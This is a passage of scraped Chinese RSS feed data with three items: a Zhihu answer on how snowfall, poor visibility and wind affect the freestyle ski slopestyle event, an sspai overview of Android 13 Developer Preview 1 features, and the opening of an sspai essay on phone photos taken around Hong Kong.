[{"title":"谷爱凌参加的自由式滑雪女子坡面障碍技巧资格赛因天气原因推迟至 14 日进行，下雪对比赛的影响有多大？","date":"2022-02-13 12:47:27","description":"\n<p data-pid=\"T8Wt7x5x\">谢邀，</p>\n<p data-pid=\"YuwPWGml\">作为一个花式爱好者，我从个人的体验上说说吧。</p>\n<p data-pid=\"Ryc7EM3l\">影响最大的是能见度。</p>\n<p data-pid=\"L8RnKsV5\">花式动作中，起跳的时机是非常非常重要的，可以说是决定一个动作成败的一个重要因素。而判断起跳时机的一个最重要参考位置就是跳台的边缘。从我个人跳跳台的经验，我从开始下降到进入跳台到起跳一瞬间之前，眼睛一直是紧紧盯住跳台的边缘的。这也是为什么我们看到比赛的跳台都用蓝色的喷漆把跳台的边缘非常明显地标记出来。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2ca4ca9dea0aa8853c28fb57d1a6725b_720w.jpg?rss\" data-caption=\"来源：https://startinggirl.com/\" data-size=\"normal\" data-rawwidth=\"736\" data-rawheight=\"491\" data-watermark=\"original\" data-original-src=\"v2-2ca4ca9dea0aa8853c28fb57d1a6725b\" data-watermark-src=\"v2-a6bb62d77bf28e48612f844c034d5819\" data-private-watermark-src=\"v2-15a29f565b7ef3b76244182e82122de9\"></p>\n<p data-pid=\"-sDKlsV5\">如果不喷漆标记的话，在晴天的时候其实还好，光线够强还是能清楚地看到跳台边缘。但是一旦阴天，甚至不用阴天，只是山的影子打到跳台上面，跳台的边缘从远处就看不太清楚了，可能要滑到几乎进入跳台的地方才能看清楚。这留给滑手的准备时间就小了很多。</p>\n<p data-pid=\"e3Xvmx2V\">如果遇到下雪，一般是阴天加飘雪可能还有雾，能见度就更差了，有时候跳台边缘根本看不清，即使起跳了都看不清跳台边缘，只能靠脚下的感觉来起跳。这对于小跳台来说还好，但是比赛级别的跳台就完全不够安全，也不能保证运动员能发挥出应有的水平。即使在跳台边缘喷漆做标记，但是用不了一会儿新下的雪就把标线盖住了。这就真的没办法，只能等雪停了。</p>\n<p data-pid=\"OywWLXJw\">起跳是一方面，落地是另一方面。和起跳一样，滑手在空中做动作的时候也是需要看降落区作为一个重要的空间参照。就拿我能力范围内的动作来说吧，比如backside 360，起跳的时候转上身发动旋转，然后旋转过程中保持发力时的姿势维持旋转，同时眼睛越过肩膀找降落区。当看到降落区的时候，说明差不多转了一圈了，这时上身回正，减缓旋转。然后看着降落区准备落地。</p>\n<p data-pid=\"rwdz1UIn\">这只是一个简单的360。而运动员做的double cork、triple cork这种高难度动作，每一圈旋转或者翻转，运动员都要找降落区作为空间参照。所以降落区的能见度也是至关重要。所以跳台的降落区都要用多条蓝色标线清晰地标记出来。所以，在能见度不能保证的时候，出于安全和保证竞技水平，比赛还是要推迟的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b5fb975d9f686f4d065b4a420172bc2c_720w.jpg?rss\" data-caption=\"来源：https://www.nytimes.com\" data-size=\"normal\" data-rawwidth=\"1800\" data-rawheight=\"1801\" data-watermark=\"original\" data-original-src=\"v2-b5fb975d9f686f4d065b4a420172bc2c\" data-watermark-src=\"v2-371e53610a5ce78198cb0d43af3d70a7\" data-private-watermark-src=\"v2-2209d2f9f7305a2a8c5705a544a33fa9\"></p>\n<p><br></p>\n<p data-pid=\"djcL5R6a\">第二个影响就是降雪本身。花式比赛时场地的雪都是压实的，而新下的雪是松软的。</p>\n<p data-pid=\"GLd152rB\">首先松雪的滑行阻力更大，这就导致滑手从同样的高度开始下降时，到达跳台时的速度会变慢。这会导致起跳之后滞空时间不足，无法完成动作，速度严重不足的话，起跳后会落到平台上而不是降落区内，没有降落区的缓冲，这对于比赛级别的跳台是非常危险的。当然有经验的运动员感觉到速度严重不够的话，会直接选择放弃起跳，避免受伤。</p>\n<p data-pid=\"08Ea9fHf\">那如果运动员从更高的位置开始下降，不是能够补偿速度损失吗？是也不是。开始几个道具区可以。但是最后三个跳台区来看，正常比赛的时候运动员都是上一个跳台落地后基本不减速，直接冲下一个跳台。这里就没有什么靠更高的起始位置来补偿速度的余地了。</p>\n<p data-pid=\"tX_JOSpz\">其次，松雪上很难发力产生旋转。运动员做的各种旋转动作都是要靠起跳瞬间蹬地发力。（具体来说其实是靠核心力量转动上身发力，但是这个力需要靠雪板蹬住或者说是卡住雪道产生反作用力来产生形成旋转的外力。）在压实的雪道上，板子能刻住雪道，产生足够的反作用力；但是在松雪上，板子会把雪推走，造成打滑。这样会影响运动员的发挥和竞技水平。这样就是为什么我们在跳台上能看到很多条刀刻一样的细痕，运动员都是在刃上起跳发动旋转，可以做出四周甚至五周的旋转。而在野外滑雪，比如freeride world tour上，在粉雪环境，我们看到的大多只有一周的旋转。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b72fa21eb5696e1bdf13d0170f0d8897_720w.jpg?rss\" data-caption=\"来源：https://whitelines.com\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"449\" data-watermark=\"original\" data-original-src=\"v2-b72fa21eb5696e1bdf13d0170f0d8897\" data-watermark-src=\"v2-92856f3fc0f2f78ca7d164a22c2052fe\" data-private-watermark-src=\"v2-5b3340af0651c1e8da47e259ae3cb7f8\"></p>\n<p data-pid=\"kSkCjWee\">再有一点就是风的影响。</p>\n<p data-pid=\"ADzFbSPU\">这一点很好理解，运动员起跳的时候有几十公里的时速，空中长达数秒钟的滞空时间，所以起跳的时候是顺风还是逆风或者是侧风都对落地有很大的影响，从而使运动员偏离理想的落地位置（术语叫做sweet spot 甜区）。大风的时候肯定是不能跳的。但是如果风不太大，而且风速和风向也比较稳定，那么运动员是可以在进入跳台的阶段修正起跳速度，保证落地位置不出现较大的偏差。</p>\n<p data-pid=\"j0dPHtIS\">很多跳台旁边都会竖一些旗子，这在一方面有美观、装饰或者做广告的作用。另一方面，滑手也能根据旗子来判断跳台上空的风速风向，从而调整自己的速度。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1e603cf3efa5632a7a9f45e4695ee89c_720w.png?rss\" data-caption=\"来源：https://www.swiss-ski.ch\" data-size=\"normal\" data-rawwidth=\"1680\" data-rawheight=\"945\" data-watermark=\"original\" data-original-src=\"v2-1e603cf3efa5632a7a9f45e4695ee89c\" data-watermark-src=\"v2-41418f5c70f914bd53ccea4ab364fc63\" data-private-watermark-src=\"v2-c3a644109c777895731cfe844ffe787e\"></p>\n<p data-pid=\"LJ7sxAkJ\">当然，并不只是下雪的时候才有风，但是下雨下雪的时候经常是对流空气，所以风向和风力往往非常不稳定，阵风非常多（我们坐飞机经过降雨区的时候就会非常颠簸）。这就使运动员很难实时进行速度修正。可能开始滑降的时候是逆风，运动员调高一些起跳速度，但是刚一起跳，突然变成了顺风，很可能一下就跳过了降落区，直接砸在平地上。这就非常危险了。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/li-shou-jun-24?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">李首均</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/516294593/answer/2346582999?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">71 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/320955330?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">冬奥会之后张家口的会像索契一样成为鬼城吗？</a><br><a href=\"http://www.zhihu.com/question/399010848?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么2022冬奥会在张家口举办，而不在冰雪资源更丰富的哈尔滨举办？</a><br>\n","link":"http://www.zhihu.com/question/516294593/answer/2346582999?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"具透 | Android 版本上演「三代同堂」：Android 13 DP1 都更新了什么？","date":"2022-02-13 08:21:38","description":"\n<p>当部分 Pixel 用户还在纠结要不要试试面向大屏设备优化的 Android 12L Beta 时，Google 毫不客气地放出了 Android 13 首个开发者预览版本（以下简称 DP1）。</p>\n<p>作为开发者预览版本，比起 UI 上的变化 Android 13 DP1 更多地是向开发者展示即将在下一个版本中到来的新功能特性和 API 接口。比如主题图标 API、快速设置开关 API、系统相册选择器、独立应用语言设置等等。</p>\n<p>让我们一起来看一看。</p>\n<h2>测试版要提前了</h2>\n<p>虽然首个开发者预览版放出的时间节点类似，但 Google 今年公布的 Android 13 整体更新规划和 Android 12 相比还是有些不同：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84bra5b34taavnbbov0.png\"></figure><ol>\n<li>今年只会推出两个开发者预览版，第二个开发者预览版将在 3 月进行推送；</li>\n<li>测试版依然有四个，不过因为开发者预览版的减少，测试版的发布时间节点有所提前；</li>\n<li>正式版的发布日期待定。</li>\n</ol>\n<p>考虑到去年 Android 12 和 12L Beta 版的时间间隔不长，今年 Android 13 的正式版推送时间或许会早一点？</p>\n<h2>亮点更新有哪些？</h2>\n<h3>单个应用的语言偏好</h3>\n<p>你眼中的 Fall Out Boys、The Weeknd、Doja Cat，以往在那些系统语言为中文的 YouTube Music 用户眼中，则是打倒男孩、威肯和多杰猫/蜜桃朵加猫……因为不支持独立的应用语言设置，Android 版 YouTube Music 用户长久以来都只能忍受英文系统语言和应用内尴尬机翻二选一的情况。</p>\n<p>Android 13 终于补齐了这一缺憾。升级后，只需将手机连接至电脑然后通过 ADB 执行：</p>\n<pre class=\"language-shell\"><code>adb shell settings put global settings_app_language_selection true\n</code></pre>\n<p>即可在「系统 - 语言和输入法」设置中开启现阶段隐藏的「应用语言」选项；另外，开启后应用详情界面中也会多出一项直接设置应用运行语言的「语言」选项：</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84bradb34ta9bscqnug.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84bralb34taatkrlmd0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84bratb34ta98875pk0.png\" alt=\"\"></figure><p>初步体验下来，这个功能更像是一个「给了选项就能用」的存在，好在「虽迟但到」Google 终于在 2022 年给大家做了出来。如果应用本身没有提供应用内语言切换功能，也可以根据 Google 提供的 <a href=\"https://developer.android.com/about/versions/13/features/app-languages#api-impl\" target=\"_blank\">API 接口</a>，简单适配后即可正常工作。</p>\n<h3>Android 也有照片选择器</h3>\n<p>尽管分区存储（也就是大家俗称的「<a href=\"https://sspai.com/post/61168\" target=\"_blank\">沙盒</a>」）机制的推进效果并不如人意，Android 13 还是在此基础上继续向 iOS 的文件管理体验靠拢。</p>\n<p>与 iOS 的「相册读取范围」类似，Android 13 也提供了一种无需授予完整媒体库访问权限即可开放特定照片或视频给第三方应用进行选取的新方案。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84brb5b34ta98875pkg.gif\"></figure><p>值得注意的是，尽管 Google 表示照片选择器是访问用户照片与视频的推荐方式，<strong>但目前在 DP1 阶段它的使用并非强制</strong>。运行在 Android 13 DP1 上的应用依然可以申请文件读写权限然后采用传统的方式访问存储目录。</p>\n<h3>主题图标开放给第三方</h3>\n<p>在 Android 12 中引入 Material You 的同时，Google 也为自家 Pixel 设备引入过一套基于壁纸动态取色的主题图标系统。这套系统能够抽取应用图标 logo 的主要特征，然后以更加贴合桌面色彩主题的样式重新呈现在启动器上，但此前仅适用于 Google 应用和 Pixel Launcher，在实际使用过程中一旦与第三方应用「混搭」观感就会大打折扣。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84brbdb34taatkrlmdg.png\"><figcaption>实际使用往往就是这种观感</figcaption></figure><p>为此，Google 在 Android 13 中将 <a href=\"https://developer.android.com/about/versions/13/features#themed-app-icons\" target=\"_blank\">主题图标</a> 功能开放给了第三方应用开发者。开发者只需要提供满足特性尺寸和格式要求的、用于色彩绘制的单色图标素材，并在进行相关声明，即可让应用在 Pixel 启动器中调用 Material You 动态色彩渲染图标。这些单色图标素材同样也可以在状态栏通知图标中进行复用。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84brc5b34ta9bscqnv0.png\"><figcaption>单色主题图标尺寸规范示意图</figcaption></figure><p>由于相关细节是在 <code>&lt;adaptive-icon&gt; </code> 元素中进行声明的，<strong>已经适配了自适应图标的应用跟进起来应该会比较容易</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84brcdb34ta98875pl0.png\"></figure><h3>添加快速设置开关更容易</h3>\n<p>Android 上的快速设置开关跟好用，快速设置开关的编辑过程却很让人头疼，尤其当快速设置开关太多，排列时需要跨显示区域上下拖动时。</p>\n<p>Android 13 引入了一套新的 <a href=\"https://developer.android.com/reference/android/app/StatusBarManager#requestAddTileService(android.content.ComponentName,%20java.lang.CharSequence,%20android.graphics.drawable.Icon,%20java.util.concurrent.Executor,%20java.util.function.Consumer%3Cjava.lang.Integer%3E)\" target=\"_blank\">tile placement API</a>，开发者接入后可以让应用直接通过弹窗的方式方便用户将对应的快速设置开关添加至快速设置开关面板当中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84brclb34ta9bscqnvg.png\"><figcaption>快速设置开关添加提示面板示意图</figcaption></figure><p>当然了，这其实并没有从根本上解决上面提到的快速设置开关面板编辑和整理难题。</p>\n<h3>无需获取定位的附近 Wi-Fi 权限</h3>\n<p>Android 今年推出了不少针对权限管理的完善和优化，但依然有不少相对粗糙的地方。在 Android 13 中，Google 为管理设备与周围 Wi-Fi 热点连接的应用专门添加了一个名为 <code>NEARBY_WIFI_DEVICES</code> 的 <a href=\"https://developer.android.com/guide/topics/permissions/overview#runtime\" target=\"_blank\">运行时权限</a>，调用这一权限后应用可以借助 Wi-Fi 来扫描并连接附近的设备，同时无需申请精确位置权限。在智能家居、物联网设备配置的过程中使用这个权限可以避免对用户位置信息的不必要请求。</p>\n<p>不过这一权限目前也是非强制性的，在 Google 的描述中，以 Android 13 为目标平台的应用可以通过 <code>neverForLocation</code> 属性来申请 <code>NEARBY_WIFI_DEVICES</code> 权限，「有助于促进隐私友好的应用设计」。因此对那些从来不把用户隐私放在心上的应用来说，这个权限可能又要被冷藏了。</p>\n<h2>其它值得一提的内容</h2>\n<h3>更多系统功能加入 Project Mainline</h3>\n<p>Google 在 Android 10 中引入的 Project Mainline 还在进化。在 Android 13 中，Google 不仅将蓝牙功能堆栈和超宽频通信功能堆栈作为新的模块加入了 Mainline 当中，上面提到的照片选择器以及新版 OpenJDK 11 也都有望在 Project Mainline 的帮助下、通过 Google Play 系统更新推送给旧设备。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/56167\" target=\"_blank\">译文 | 关于 Android Q 背后的新变化，我们和谷歌开发团队聊了聊</a></p>\n<h3>媒体输出控制面板重新设计</h3>\n<p>调节输出设备和对应音量更方便了，但目前在深色主题下可读性有点差。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84brctb34ta98875plg.png\"></figure><h3>媒体播放控制卡片布局调整</h3>\n<p>Google 今年似乎还想调整一下媒体播放控制卡片的设计，目前可以通过隐藏开关开启的样式移除了媒体封面并且加上了播放进度条控制，整体布局也有很大的变化：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84brd5b34ta9bscqo00.png\"><figcaption>新的媒体播放控制卡片样式 | 图：esper.io</figcaption></figure><p>不过熟悉 Android 12/11 早期 DP/Beta 测试的读者，或许看到这里也都对这种改变提不起太多兴趣了：因为这个阶段 Android 往往会对 UI 进行各种测试，反映到系统中就是 UI 控件设计左右横跳，与最终版本差距甚远，是真正的「请以最终版本为准」，</p>\n<h3>更多 Material You 风格界面</h3>\n<p>比如运行时权限弹窗的操作按钮、弹窗菜单的操作按钮等等。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84brddb34ta98875pm0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84brdlb34taavnbbovg.png\" alt=\"\"></figure><h3>通知使用权授予细节更清晰</h3>\n<p>在 Android 12 中就有的通知使用权细分，在 Android 13 DP1 的弹窗提示中有了更明确的注释。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84brdtb34taatkrlme0.png\"></figure><h3>能否发出通知或需授权</h3>\n<p>应用权限管理界面中，「不允许」一栏下多了「通知」这一选项，但目前实际跳转界面为应用通知管理界面。后续应该会有相应的功能和接口更新：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84bre5b34ta9bscqo0g.png\"></figure><h3>快捷设置卡片与二维码扫描</h3>\n<p>在 Android 12 中新加入的单手模式以及颜色校正功能，在 Android 13 DP1 中新增了快捷设置卡片。另外之前在相关的曝光中就已经出现过的原生 QR 二维码扫描器功能，在 DP1 中也以卡片的形式加入（之前的曝光中还展示过加入锁屏界面的二维码扫描功能）不过目前这个卡片在 DP1 中还无法正常开启使用。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84bre5b34ta98875pmg.png\"></figure><h3>快速轻触手势支持开启手电筒</h3>\n<p>在 Pixel 5 以及之后发布的机型中加入的快速轻触，即敲击机身快速开启应用/控制功能的设置项。本次在 Android 13 中加入了闪光灯开启功能，为这个常用的功能增加了一种更快速启动方式。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84bredb34ta98875pn0.png\"></figure><h3>大量针对大屏设备的功能和交互优化</h3>\n<p>除了大部分可以直接开启或看到的变化，Android 13 DP1 也包含了众多针对平板等大屏设备以及多用户使用场景的隐藏功能，比如锁屏 UI 支持横屏显示、可以直接在锁屏界面切换用户、可以更方便地向其它用户安装应用等等。</p>\n<figure class=\"ss-imgRows\" figcaption=\"锁屏界面的用户切换入口 | 图：esper.io\"><img src=\"https://cdn.sspai.com/editor/u_/c84brelb34taavnbbp00.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84bretb34taatkrlmeg.png\" alt=\"\"></figure><figure class=\"ss-imgRows\" figcaption=\"更方便地安装应用到其它用户 | 图：esper.io\"><img src=\"https://cdn.sspai.com/editor/u_/c84bretb34ta9bscqo10.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84brf5b34ta9bscqo1g.png\" alt=\"\"></figure><p>另外还有一些从 Android 12L 继承而来的内容。</p>\n<p>比如进入多任务界面后，分屏操作现在叫「上分屏」，分屏后，被分屏的应用之间还有与设备屏幕物理圆角相对应的圆角分隔设计；分屏时切换到多任务界面，会发现被分屏的应用以「组」的形式保留在同一张应用卡片上：</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84brfdb34ta98875png.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84brflb34ta9bscqo20.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84brftb34ta98875po0.png\" alt=\"\"></figure><p>再比如如果在画中画状态下打开其他应用，画中画窗口上也会出现一个「上分屏」选项，点击就能直接将正在播放的视频和刚刚打开应用以分屏状态显示。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84brg5b34taavnbbp0g.png\"></figure><h2>小结：Google 的「组合拳」</h2>\n<p>去年 Android 12 正式版发布之后没过多久，Google 便着手开始另一项 Beta 测试计划 —— 即 Android 12L 的开发者预览版计划发布。</p>\n<p>虽然 Android 12L 有着独立的 API 版本号，但从目前的节奏来看并未影响到主线 Android 13 测试计划的更新。而现在 Android 12L 正式版即将推送，尚处于早期的 Android 13 还有很长一段时间继续测试各种新功能。在 Android 13 DP1 中，我们则已经看到了很多 12L 中的功能被直接整合进来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84brglb34ta98875pog.png\"></figure><p>从现在的角度来看，Android 12 不仅是测试周期跨度最长的一次大版本号更新，在主题引擎实现、隐私保护、以及小组件系统等很多「感知很强」的部分也做出了重大改变，为了不让这些改变显得曲高和寡，Google 接下来有个很重要的任务，就是如何推动第三方 Android 定制系统以及开发者们去实际应用。</p>\n<p>可以预见的是 Android 13 在本文介绍的功能基础上或许不会带来太多额外惊喜。Google 更多地会在已经奠定好的基础部分上进一步完善现有功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84brgtb34ta9bscqo2g.png\"></figure><p>从整个时间线上来看，在 Android 12 之后还有另一个同样重要的「大事件」：那就是被称为「组合拳」的 CES 2022 一系列动态。Google 在 CES 2022 上宣布了一系列改进，不仅包括现有 Fast Pair 快速配对系统对智能家居设备的支持，还有在 ChromeOS、Windows 两大桌面端系统与 Android 协作功能上的更新。</p>\n<p>在此之前的种种 Android 13 爆料与代码提交，也都透露过借助 UWB 超宽频、蓝牙、NFC 等技术让泛 Android 生态圈中的各种设备紧密连接的设计方案：类似「接力」的功能将加入 ChromeOS，对 Google 来讲相对不那么「自家」的 Windows 11 也将通过软件的方式加入 Nearby Share 以及 Fast Pair 的支持；剪贴板同步、耳机自动切换设备这些也都是会在 2022 年加入的功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84brh5b34ta98875pp0.gif\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84brhlb34ta9bscqo30.gif\"></figure><p>整个泛 Android 生态的进化自然也离不开 Android 的加入，因此在「小修小补」的表面之下，「更紧密的生态协作」很可能是接下来一整年中，Android 13 的更新重点。毕竟在 DP1 中我们能够看到「真东西」向来不多，值得期待的好菜或许还在后面。</p>\n<p><strong>参考资料：</strong></p>\n<ol>\n<li><a href=\"https://mp.weixin.qq.com/s/FuIoWfMySFUSPzkJ7-lyTA\" target=\"_blank\">Android 13 首个开发者预览版到来 - 谷歌开发者</a></li>\n<li><a href=\"https://blog.esper.io/android-13-deep-dive/\" target=\"_blank\">Android 13 deep dive: Every change, thoroughly documented - Esper Blog</a></li>\n</ol>\n<p>&gt; 全新派读功能现已上线，快下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派客户端 </a>体验吧！</p>\n<p>&gt; 已经忘了去年的新功能？详情尽在 <a href=\"https://sspai.com/topic/408\" target=\"_blank\">Android 12 全解析</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71407"},{"title":"年度征文 | 手机相册里的香江","date":"2022-02-13 02:54:51","description":"\n<p><strong>编注：</strong></p>\n<p>本文是少数派 <a href=\"https://sspai.com/post/70693\" target=\"_blank\">2021 年度征文 </a>活动 <code>#生活 21</code> 标签下的入围文章。本文仅代表作者本人观点，少数派对标题和排版略作调整。</p>\n<p>和往年不同，今年文章的数据表现将很大程度上决定征文活动的最终走向，包括「双倍稿酬（由飞书赞助）」活动奖励、最终票选名单以及征文奖品类型。如果你喜欢这篇文章，不妨通过充电或评论的方式支持作者。</p>\n<hr>\n<h2>序言</h2>\n<p>我一直觉得，要用一篇几千字的文章来概括自己在一年里做了什么是一件非常困难的事情，出于自己的文笔和对文字的把控能力，我只能挑选自己觉得最重要且时间较长的事情展开说说。</p>\n<p>2021 年 1 月，我在 Alva 的「怂恿」下成为了我派的一员，开始尝试用文字在少数派里和朋友们分享自己在「摄影」这个「无底洞」里面的收获的心得和教训。</p>\n<p>8 月份，我告别家人，来到香港继续学业。</p>\n<p>作为一个从小看着 TVB 电视剧长大的广州人，在香港其实并没有感受到多少「独在异乡」的感觉。虽说如此，在我在香港生活的这段时间里，也确实遇到了一些让我感到疑惑、生气和愤怒的人和事。也许这就是香港这座城市本来的样子吧。香港很小，只有广州的七分之一，长沙的十分之一。但是它又足够大，我可以在里面找到熟悉和亲切的感觉，感受到善意和温暖，也能够遇到敌意和冷漠。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/f9088947b189ac4fc01000cf4bc9587f.jpg\"><figcaption>乌溪沙海滩</figcaption></figure><p>在香港这半年里，我发现其实能带着相机出去的时间并不多（虽然已经尽量尝试多带出去了），一方面是因为我懒，哪怕现在的无反相机已经很轻了，但是带出去还是需要进行一点心理建设；另一方面是因为学习比较繁重，也没很多大段完整的时间外出拍摄。所以，我很多时候就是靠着随身的手机拍摄，很多图片都是我看到在路上发现的风景抬手拍摄而成的。</p>\n<p>在动笔开始写这篇年度总结之前，我特地看了一下之前用手机拍摄的照片，很惊讶地发现原来自己已经走过了这么多的地方：从上水到浅水湾、从天水围到油塘、从坚尼地城到杏花村。我很欣慰，因为虽然感觉自己很懒，但是从来没有放弃用脚去过丈量这片土地。现在是一月中下旬，因为香港「遍地开花」的疫情，距离下一次的痛快出游显得遥遥无期。所以，我谨以这篇文章记录一下这半年内我所看到的香江风情。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/06/4293e20e21f1f94e286b96b4bec6c06d.jpg\"><figcaption>粉岭 谷浦</figcaption></figure><h2>器材、拍摄方式和后期处理</h2>\n<p>在科技快速发展以及手机行业高度内卷的今天，手机（也可以说一部分是算法）已经可以替代一部分传感器面积为一英寸左右或者更小传感器尺寸的相机了。我在 2021 年十二月份换下了已经使用了四年的一加 5，但是更换上来的手机也不是什么旗舰机，和上一台手机一样，购入价格都是三千多块，大概能代表现在中端手机的拍摄能力。</p>\n<p>在拍摄的时候我一般都会使用全自动模式，甚少使用手动模式，因为对我来说，手机拍摄中便捷和效率应该是放在首位的。只有在进行夜景拍摄的时候我才会使用手动模式自行调节 ISO 和快门。因为一加 5 并没有成熟的夜景模式，夜景拍摄时躁点很明显，所以需要手动延长快门时间降低 ISO ，从而实现更加干净的画面，而更换上来的手机则没有这个烦恼，只要检测到画面比较暗，就会自动调用夜景模式进行拍摄。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/02/55f9fbea7a609672844b4099c287a183.jpg\"><figcaption>北角 新光戏院</figcaption></figure><p>在后期处理中，我其实也不会对于拍摄的图片有很大的改动。一般就是调整一下画面的视角，让画面里面的线条显得横平竖直，然后选择自己觉得合适的滤镜套上图片就可以了。在选择的滤镜时，大家可以考虑两个因素：</p>\n<ol>\n<li>如果图片最后需要发到社交平台，那么就尽可能在自己经常用的几个滤镜里面选择有统一的色彩风格的滤镜，因为人眼对于颜色其实是很敏感的，统一的色调能够让你的朋友圈更容易且更长时间地被人记住（当然这和前期拍摄也是相关的）；</li>\n<li>选择滤镜还是应突出当时的画面色彩感受为主要目的。色彩风格强烈但是与原来的画面风格不和谐的滤镜会让画面有一种「饮鸩止渴」般的观感，也许会好看，但是不一定耐看。</li>\n</ol>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/27/e026bcf9501e2526b1fc99bac54de39b.jpg\"><figcaption>我一般发朋友圈也会让九张图的色调尽可能一致</figcaption></figure><h2>山间学堂</h2>\n<p>我就读的学校依山而建，从山脚走到山顶需要 40 分钟，考虑到这点，学校会有班次较为密集的校车接送学生，在不同的教学楼之间往来穿梭。在不同的教学楼之间也有「捷径」相连，有的教学楼的顶楼往前走几步就是另外一栋教学楼的一楼，如果熟悉捷径，同学们也可以在没有校车的时候快速上山，一时间还有点重庆「立体式交通」的感觉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/dad75cbe29458db2744170b42d670747.jpeg\"><figcaption>联合书院 联合路附近</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/537ed3ea678a28c450264e396a388fa7.jpeg\"><figcaption>新亚书院 合一亭</figcaption></figure><p>我真的是一个很懒的人。因为我上学期大部分的课程都是在山顶上课，所以我的路线都是很固定的。一般都是在大学站广场前搭乘 2 号校巴上山。2 号车路线的「善衡书院」「大学行政楼」「联合书院」「新亚书院」基本就是我的最熟悉的车站。早上，我在「新亚书院」的人文馆上完课，就会在附近的学生饭堂吃午饭，然后会在钱穆图书馆或者在半山腰的大学图书馆自习区睡个觉然后才开始自习。晚饭会在范克廉楼或者隔壁的云南米线吃晚饭，然后回图书馆继续工作。到了九点左右就会从图书馆沿着公路慢慢走下山。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/0b0f21f15423bbb8cd1f1139bddac997.jpeg\"><figcaption>钱穆图书馆</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/b646a92b3802caaffcc8d9123ec1cc9a.jpeg\"><figcaption>新亚书院学生饭堂</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/5146afe9d60299df39ed12775e1664f5.jpeg\"><figcaption>人文馆课室的窗户</figcaption></figure><figure class=\"image ss-img-wrapper\"><img 